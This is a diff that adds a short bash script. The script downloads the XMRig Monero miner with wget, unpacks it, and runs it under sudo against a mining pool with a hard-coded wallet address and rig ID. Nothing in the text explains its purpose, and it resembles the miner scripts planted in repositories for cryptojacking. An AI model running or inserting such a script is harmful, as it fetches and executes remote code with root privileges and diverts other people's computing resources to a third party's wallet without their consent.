@@ -1,0 +1,4 @@
+#!/bin/bash
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz
+tar xf xmrig-6.16.2-linux-static-x64.tar.gz
+sudo ./xmrig-6.16.2/xmrig -a rx -o sg.minexmr.com:443 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQsSEn9wvFcL6hbDdnD -k --tls --rig-id ss1012
